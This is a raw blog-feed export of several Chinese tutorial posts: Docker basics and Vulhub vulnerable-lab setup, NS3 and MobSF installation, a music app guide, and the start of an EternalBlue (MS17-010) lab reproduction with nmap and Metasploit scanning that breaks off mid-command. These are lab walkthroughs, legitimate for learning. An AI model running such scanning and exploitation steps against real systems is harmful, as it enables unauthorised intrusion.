href="https://zh.wikipedia.org/wiki/IP%E5%9C%B0%E5%9D%80">IP地址</a>、独立<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>、独立存储空间、独立<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98">内存</a>、独立<a href="https://zh.wikipedia.org/wiki/CPU">CPU</a>资源、独立执行程序和独立系统配置等。VPS主机用户可在服务器上自行安装程序，单独重启主机。</p><p>在中国大陆等网络遭<a href="https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E9%95%BF%E5%9F%8E"><sup>审查封锁</sup></a>的地区，境外VPS被广泛用于搭建VPN通道、Proxy <a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8#cite_note-1"><sup>[1]</sup></a>。</p></blockquote><h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><blockquote><p><em>Docker 是一个开源的应用容器引擎，基于 <em><a href="https://www.runoob.com/go/go-tutorial.html">Go 语言</a></em> 并遵从 Apache2.0 协议开源。</em></p><p><em>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</em></p><p><em>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</em></p></blockquote><blockquote><p>Docker 包括三个基本概念:</p><ul><li><strong>镜像（Image）</strong>：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。</li><li><strong>容器（Container）</strong>：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</li><li><strong>仓库（Repository）</strong>：仓库可看成一个代码控制中心，用来保存镜像。</li></ul><p>Docker 使用客户端-服务器 (C&#x2F;S) 架构模式，使用远程API来管理和创建Docker容器。</p><p>Docker 容器通过 Docker 镜像来创建。</p><p>容器与镜像的关系类似于面向对象编程中的对象与类。</p></blockquote><p>docker以及docker-compose安装过程 省略</p><h1 id="docker安装与配置"><a href="#docker安装与配置" class="headerlink" title="docker安装与配置"></a>docker安装与配置</h1><h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><p>在Linux虚拟机中使用以下命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/yijingsec/LinuxEnvConfig.git</span><br><span class="line"></span><br><span class="line">cd LinuxEnvConfig</span><br><span class="line"></span><br><span class="line">sudo bash LinuxEnvConfig.sh</span><br></pre></td></tr></table></figure><p>执行完成后，在选择界面选择”安装Docker”</p><h2 id="docker换源"><a href="#docker换源" class="headerlink" title="docker换源"></a>docker换源</h2><p>Docker换源</p><p>Docker的默认镜像源是国外的网站，需要翻墙才可以访问，所以需要对Docker进行换源</p><p>使用vim &#x2F;etc&#x2F;docker&#x2F;daemon.json 命令，写入以下内容后保存退出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">  &quot;https://hub.uuuadc.top&quot;,</span><br><span class="line">  &quot;https://docker.anyhub.us.kg&quot;,</span><br><span class="line">  &quot;https://dockerhub.jobcher.com&quot;,</span><br><span class="line">  &quot;https://dockerhub.icu&quot;,</span><br><span class="line">  &quot;https://docker.ckyl.me&quot;,</span><br><span class="line">  &quot;https://docker.awsl9527.cn&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>换源完成后需要重启Docker</p><p>使用systemctl daemon-reload 命令重新加载Docker源</p><p>使用systemctl restart docker 命令重启Docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h1 id="Docker基础操作"><a href="#Docker基础操作" class="headerlink" title="Docker基础操作"></a>Docker基础操作</h1><p><a href="https://blog.csdn.net/m0_37714245/article/details/81713477">Docker基本操作_docker 基本操作-CSDN博客</a></p><p><a href="https://blog.csdn.net/Fighting_hawk/article/details/122706496">【环境搭建】Docker镜像相关操作（切换镜像源、查询、获取、查看、创建、上传、保存、删除等）_查看docker镜像源-CSDN博客</a></p><h2 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h2><h3 id="启动Docker"><a href="#启动Docker" class="headerlink" title="启动Docker"></a>启动Docker</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h3 id="查看Docker状态"><a href="#查看Docker状态" class="headerlink" title="查看Docker状态"></a>查看Docker状态</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure><h3 id="设置Docker开机自启"><a href="#设置Docker开机自启" class="headerlink" title="设置Docker开机自启"></a>设置Docker开机自启</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><h2 id="Docker镜像操作"><a href="#Docker镜像操作" class="headerlink" title="Docker镜像操作"></a>Docker镜像操作</h2><h3 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker image ls -a</span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line">REPOSITORY：镜像所在的仓库名称</span><br><span class="line">TAG：镜像标签</span><br><span class="line">IMAGEID：镜像ID</span><br><span class="line">CREATED：镜像的创建日期(不是获取该镜像的日期)</span><br><span class="line">SIZE：镜像大小</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1716860266584-1a47f90e-466e-458a-a5e4-b6138508e554.png"></p><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker image pull library/hello-world</span><br><span class="line">拉取名为hello-world的镜像文件</span><br><span class="line"></span><br><span class="line">docker image pull：抓取 image 文件的命令</span><br><span class="line">library/hello-world：image 文件在仓库里面的位置</span><br><span class="line">library：是 image 文件所在的组</span><br><span class="line">hello-world：是 image 文件的名字</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1716860581153-7e118fc2-6359-40af-9150-89b601276f07.png"></p><blockquote><p>由于Docker官方提供的image文件，都放在library组里面，所以它的是默认组，可以省略。因此，上面的命令可以写成下面这样：</p><p>docker image pull hello-world</p></blockquote><h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker image rm 镜像名或镜像id</span><br><span class="line">docker rmi 镜像名或镜像id</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line">docker image rm hello-world</span><br><span class="line">docker rmi feb5d9fea6a5</span><br><span class="line">镜像id可以只写开头几个字符</span><br><span class="line"></span><br><span class="line">正在运行容器的镜像无法删除（就相当于正在打开文件的文件夹无法删除）</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1716860735657-79a686b2-8347-48f4-92ad-95b8a8d7d572.png"></p><blockquote><p>这里的rmi的i表示image</p></blockquote><h2 id="Docker容器操作"><a href="#Docker容器操作" class="headerlink" title="Docker容器操作"></a>Docker容器操作</h2><h3 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run [option] 镜像名 [向启动容器中传入的命令]</span><br><span class="line"></span><br><span class="line">-i 表示以“交互模式”运行容器</span><br><span class="line">-t 表示容器启动后会进入其命令行。</span><br><span class="line">加入这两个参数后，容器创建就能登录进去。即 分配一个伪终端。</span><br><span class="line"></span><br><span class="line">--name 为创建的容器命名</span><br><span class="line">-v 表示目录映射关系(前者是宿主机目录，后者是映射到宿主机上的目录，即 宿主机目录:容器中目录)，可以使 用多个-v 做多个目录或文件映射。注意:最好做目录映射，在宿主机上做修改，然后 共享到容器上。</span><br><span class="line">-d 在run后面加上-d参数,则会创建一个守护式容器在后台运行(这样创建容器后不会自动登录容器，如果只加-i -t 两个参数，创建后就会自动进去容器)。</span><br><span class="line">-p 表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p 做多个端口映射</span><br><span class="line">-e 为容器设置环境变量</span><br><span class="line">--network=host 表示将主机的网络环境映射到容器中，容器的网络与主机相同</span><br><span class="line"></span><br><span class="line">#创建一个交互式容器，并命名为mycentos</span><br><span class="line">docker run -it --name=mycentos centos /bin/bash</span><br><span class="line"></span><br><span class="line"> #创建一个守护式容器，并命名为mycentos2</span><br><span class="line">docker run -dit --name=mycentos2 centos</span><br></pre></td></tr></table></figure><h3 id="进入运行容器"><a href="#进入运行容器" class="headerlink" title="进入运行容器"></a>进入运行容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器名或容器<span class="built_in">id</span> 进入后执行的第一个命令</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">docker <span class="built_in">exec</span> -it mycentos2 /bin/bash</span><br><span class="line">进入后执行的第一个命令在docker ps里可以看到</span><br></pre></td></tr></table></figure><h3 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">列出本机正在运行的容器</span><br><span class="line">docker container <span class="built_in">ls</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line">列出本机所有容器，包括已经终止运行的</span><br><span class="line">docker container <span class="built_in">ls</span> --all</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h3 id="停止与启动容器"><a href="#停止与启动容器" class="headerlink" title="停止与启动容器"></a>停止与启动容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">停止一个已经在运行的容器</span><br><span class="line">docker container stop 容器名或容器id</span><br><span class="line">docker stop 容器名或容器id</span><br><span class="line"></span><br><span class="line">启动一个已经停止的容器</span><br><span class="line">docker container start 容器名或容器id</span><br><span class="line">docker start 容器名或容器id</span><br><span class="line"></span><br><span class="line">kill掉一个已经在运行的容器</span><br><span class="line">docker container kill 容器名或容器id</span><br><span class="line">docker kill 容器名或容器id</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1716861547692-d1707681-d2c3-4bf6-b43f-a884b59d016f.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1716861547632-0f74c943-8df6-479c-b791-b91521fbb5f4.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1716861547509-f5049cdc-59d8-48aa-8cb9-7d2b0ea11b62.png"></p><h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker container rm 容器名或容器id</span><br><span class="line">docker rm 容器名或容器id</span><br></pre></td></tr></table></figure><h3 id="将容器保存为镜像"><a href="#将容器保存为镜像" class="headerlink" title="将容器保存为镜像"></a>将容器保存为镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit 容器名 镜像名</span><br></pre></td></tr></table></figure><h2 id="镜像备份与迁移"><a href="#镜像备份与迁移" class="headerlink" title="镜像备份与迁移"></a>镜像备份与迁移</h2><h3 id="将镜像打包"><a href="#将镜像打包" class="headerlink" title="将镜像打包"></a>将镜像打包</h3><p>save命令可以将镜像打包成压缩文件，打包后可以拷贝给别人使用（如果在服务器中，对方可以通过访问存放路径，然后下载）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker save -o 保存路径 镜像名</span><br><span class="line">例如：</span><br><span class="line">docker save -o ./文件名.tar 镜像名</span><br></pre></td></tr></table></figure><blockquote><p>.tar是Linux的压缩包后缀</p></blockquote><h3 id="将镜像文件加载到本地"><a href="#将镜像文件加载到本地" class="headerlink" title="将镜像文件加载到本地"></a>将镜像文件加载到本地</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker load -i 保存路径</span><br><span class="line">例如：</span><br><span class="line">docker load -i ./文件名</span><br></pre></td></tr></table></figure><h2 id="Docker搭建Vulhub靶场"><a href="#Docker搭建Vulhub靶场" class="headerlink" title="Docker搭建Vulhub靶场"></a>Docker搭建Vulhub靶场</h2><h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><p>当前靶场镜像已下载到&#x2F;opt目录下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1716861744835-0df4ac96-831d-4ed4-9531-44469a19ead2.png"></p><h3 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h3><p>进入vulhub文件夹下的某个漏洞文件夹下，找到相应的.yml文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1716861903962-20c34507-1a90-49b0-badb-10045d05e8dc.png"></p><p>在该目录下输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1716862101695-2f4cdedf-0123-4c7f-bbb1-e8be3d02d55e.png"></p><p>:::info<br>注意！在启动另一个漏洞靶场时，需要先把上一个靶场容器关闭，不然会占用8080端口导致启动不成功</p><p>:::</p><h3 id="访问测试"><a href="#访问测试" class="headerlink" title="访问测试"></a>访问测试</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1716862436569-2792a3cd-ec59-469e-8ce5-6f2bba204807.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1716862609223-e14f6d1b-e76f-4772-b208-c488d1b022d4.png"></p><p>在本机浏览器中访问</p>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NS3安装</title>
      <link href="/2025/05/27/NS3%E5%AE%89%E8%A3%85/"/>
      <url>/2025/05/27/NS3%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>下载压缩包，解压</p><p>发现是直接打包好的虚拟机</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1729927190803-7993493d-382d-4ff0-89fc-527c909f9865.png"></p><p>VMware打开vmx文件是一个ubantu系统</p><p>在root的家目录下发现有一个打包好的ns3的tar.bz2文件，解压</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo tar -jxvf ns-allinone-<span class="number">3.33</span>.tar.bz2</span><br></pre></td></tr></table></figure><blockquote><p>不sudo也可以</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1729926815018-cb76f5c4-0b47-4653-8873-45400ef86f3f.png"></p><p>解压到当前目录，进入文件夹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd ns-allinone-<span class="number">3.33</span></span><br><span class="line">ls -a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1729927490093-e40ed4d6-477d-4b78-8edb-fc50e3e44cca.png"></p><p>发现有一个build.py文件</p><p>查看README，也是要执行build.py</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1729927790244-1ad0d668-514f-4379-8285-5f8f7ba80fc5.png"></p><p>运行build.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./build.py</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1729927857086-48d522f9-1ec6-4ec9-a463-5b8fdb5d6ff5.png"></p><p>下载时间很长 2000多项</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1729928672004-a462ff80-cc46-42ad-ae5d-de61028eb5d0.png"></p><p>安装完成后</p><p>进入ns-3.33目录</p><p>运行test.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd ns-<span class="number">3.33</span></span><br><span class="line">ls</span><br><span class="line">./test.py</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1729928830591-e7c9d92c-ceea-4950-a3b8-b4a57a648aca.png"></p><p>如果显示如下信息（0 failed, 0 crashed, 0 valgrind errors），则代表ns-3已经正确构建</p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mobsf的安装及安装过程中遇到的一些问题</title>
      <link href="/2025/05/27/Mobsf%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
      <url>/2025/05/27/Mobsf%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>移动安全框架（MobSF）是一个自动化、一体化的移动应用程序（Android&#x2F;iOS&#x2F;Windows）渗透测试、恶意软件分析和安全评估框架，能够执行静态和动态分析。MobSF 支持移动应用程序二进制文件（APK、XAPK、IPA 和 APPX）以及压缩的源代码，并提供 REST API，以便与 CI&#x2F;CD 或 DevSecOps 管道无缝集成。动态分析器帮助您执行运行时安全性评估和交互式检测测试。</p><p>如果使用 Docker 部署的话，Docker 不支持动态分析。</p><p>GitHub地址：</p><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a></p><h1 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h1><p>1.安装 <a href="https://www.atlassian.com/git/tutorials/install-git">Git</a><br>2.安装 <a href="https://www.python.org/">Python &gt;10</a> （需要配置环境变量）<br>3.安装 <a href="https://www3.ntu.edu.sg/home/ehchua/programming/howto/JDK_Howto.html">JDK 8+</a> （需要配置环境变量）<br>4.安装 <a href="https://visualstudio.microsoft.com/zh-hans/thank-you-downloading-visual-studio/?sku=BuildTools&rel=16">Microsoft Visual C++ Build Tools</a><br>5.安装 <a href="https://slproweb.com/products/Win32OpenSSL.html">OpenSSL (non-light)</a> （建议直接安装在默认地址）<br>6.下载和安装 <a href="https://wkhtmltopdf.org/downloads.html">wkhtmltopdf</a> （添加到环境变量PATH）</p><blockquote><p>Git、Python、JDK安装这里不进行过多赘述</p><p>Mobsf版本不同对python版本要求不同，我安装的4.0.7版本要求py版本&gt;10</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1729610270650-022b172c-e747-4f0e-b351-29b5e55d121f.png"></p></blockquote><h2 id="安装前期准备遇到的问题"><a href="#安装前期准备遇到的问题" class="headerlink" title="安装前期准备遇到的问题"></a>安装前期准备遇到的问题</h2><p>Microsoft Visual C++ Build Tools：</p><p>在官网下载安装提示安装包丢失或损坏</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1729610412307-d7ef2050-10a3-44e8-825d-74de81bb4a61.png"></p><p>具体解决方案参考<a href="https://blog.csdn.net/Zhou_Yulong/article/details/117264550">https://blog.csdn.net/Zhou_Yulong&#x2F;article&#x2F;details&#x2F;117264550</a></p><p>OpenSSL (non-light) ：</p><p>下载exe安装即可</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1729610463251-f0f2cd75-2f86-4caf-8da3-fd403229798d.png"></p><p>wkhtmltopdf：</p><p>下载安装</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1729610699519-cd98450c-5070-43ec-a9c0-c72706232971.png"></p><p>配置环境变量</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1729610750869-308b8569-f0a9-4ca0-809e-72d6808ad453.png"></p><blockquote><p>wkhtmltopdf路径\bin</p></blockquote><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><blockquote><p>安装时间很长，建议安装前进行换源</p><p>换源参考：<a href="https://segmentfault.com/a/1190000044200422#item-2">https://segmentfault.com/a/1190000044200422#item-2</a></p></blockquote><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a></p><p>下载</p><p>进入目录，打开cmd窗口，运行setup.bat</p><p>等待即可</p><p>出现绿色标识则为安装成功</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1729611039534-5ca6d5ac-a6b9-4b8c-a2b1-e165484054e9.png"></p><blockquote><p>我在后续的安装过程中没有遇到问题，如果遇到问题，参考文章</p><p><a href="https://www.cnblogs.com/B-hai/p/15696948.html">https://www.cnblogs.com/B-hai/p/15696948.html</a></p><p><a href="https://blog.csdn.net/ljh824144294/article/details/119181803">https://blog.csdn.net/ljh824144294/article/details/119181803</a></p></blockquote><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>在该目录下cmd执行run.bat</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1729611378749-7b98ec67-3ab4-4920-b12a-e29c06c977d6.png"></p><p>打开浏览器输入127.0.0.1:8000</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1729611487743-ca9f0c03-b657-4cdc-a14d-fa0b879a1bea.png"></p><p>在cmd中，我们可以看到默认账号密码（可能是新版才有的？我也不太清楚）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1729611515489-f43e79bd-75af-42ec-8891-ccf269869fc3.png"></p><p>成功启动</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1729611543223-9749b834-51a1-469a-8f6e-034885a238f6.png"></p><h1 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h1><p>我在开启MUMU模拟器之后，将apk文件放入Mobsf，他显示找不到我的安卓模拟器</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1729612539250-8abbc0c0-d42c-43fe-842f-3de0f99472ba.png"></p><p>解决方案：C盘用户目录下有一个.MobSF文件夹下config.py</p><p>修改该部分内容为模拟器的ip地址，端口号为5555（原本为空）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1730116232088-add56161-e49b-4338-9a5c-f8ffbbb915cf.png"></p><p>同时要把模拟器的root权限和ADB调试改为远程连接</p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lx音乐软件使用</title>
      <link href="/2025/05/27/lx%E9%9F%B3%E4%B9%90%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/"/>
      <url>/2025/05/27/lx%E9%9F%B3%E4%B9%90%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一共要下载两个东西，一个是setup.exe，一个是音源（可以配置多个音源）</p></blockquote><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>下载setup.exe安装软件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1731055222512-8a51e30c-f8fd-4c89-82ad-0b2915307a93.png"></p><h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1731055337396-067d6f8f-750e-4fc0-acbb-c977ddf80d89.png"></p><p>解压源.zip（音源的js文件在里面）</p><p>下载完需要配置音乐源才能使用</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1731055023461-3680c90d-7afa-41aa-a98b-9113cc308414.png"></p><p>点击自定义源管理-&gt;本地导入</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1731055103548-36c9d87a-0cde-4b9c-862f-c98efce47ca6.png"></p><p>选中js文件，打开即可</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1731055131760-c1f3ff64-990b-4aa6-8b32-5b0934976427.png"></p><p>点击初始化即可</p><h1 id="导入歌单"><a href="#导入歌单" class="headerlink" title="导入歌单"></a>导入歌单</h1><p>浏览器打开网易云音乐</p><p><a href="https://music.163.com/">https://music.163.com/</a></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250419172211535.png" alt="image-20250419172211535"></p><p>登录，登录之后点击头像</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250419172400990.png" alt="image-20250419172400990"></p><p>点击想要保存的歌单</p><p>进来之后复制一下这个</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250419172443398.png" alt="image-20250419172443398"></p><p>比如说我这里是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://music.163.com/#/playlist?id=890985862</span><br></pre></td></tr></table></figure><p>回到lx</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250419172518566.png" alt="image-20250419172518566"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250419172548115.png" alt="image-20250419172548115"></p><p>打开之后就能看到歌单了</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250419172607640.png" alt="image-20250419172607640"></p><p>收藏之后在这里就能看到</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250419172646976.png" alt="image-20250419172646976"></p><blockquote><p>不过这个收藏的歌单不会随着你网易云歌单的更新而更新</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 日常生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝漏洞复现</title>
      <link href="/2025/05/27/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/05/27/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>EternalBlue（在微软的MS17-010中被修复）是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>攻击机（kali）ip：192.168.174.130</p><p>靶机（windows server 2008 R2）ip：192.168.174.138</p><p>工具：kali自带的metasploit（msf）、nmap</p><p>利用ms17-010漏洞，靶机必须同时开启139和445端口</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="获取ip地址"><a href="#获取ip地址" class="headerlink" title="获取ip地址"></a>获取ip地址</h2><p>获取靶机ip地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p>靶机ip地址为：192.168.174.138</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231001456853.png" alt="image-20241231001456853"></p><p>获取攻击机ip地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>攻击机ip地址为：192.168.174.130</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231001522125.png"></p><p>这里windows7虚拟机和kali都为net模式，在同一C段</p><p>测试连接看能否ping通</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 靶机ip</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231001635598.png"></p><blockquote><p>ping不同的情况大概率为Windows防火墙问题，要关闭Windows防火墙（不关闭防火墙nmap扫描不到其端口，MSF利用不了永恒之蓝漏洞）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231001702869.png"></p></blockquote><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>Windows查看是否开启139和445端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr &quot;139&quot;</span><br><span class="line">netstat -ano | findstr &quot;445&quot;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231002149648.png"></p><p>139和445端口都为listening状态，说明靶机开启了139和445端口</p><p>kali中nmap对靶机进行端口扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 靶机ip</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231002007174.png"></p><p>发现开启了139和445端口</p><p>kali使用msf进行端口扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole（启用msf）</span><br><span class="line">use auxiliary/scanner/portscan/tcp（使用端口扫描模块）</span><br><span class="line"><span class="built_in">set</span> rhosts 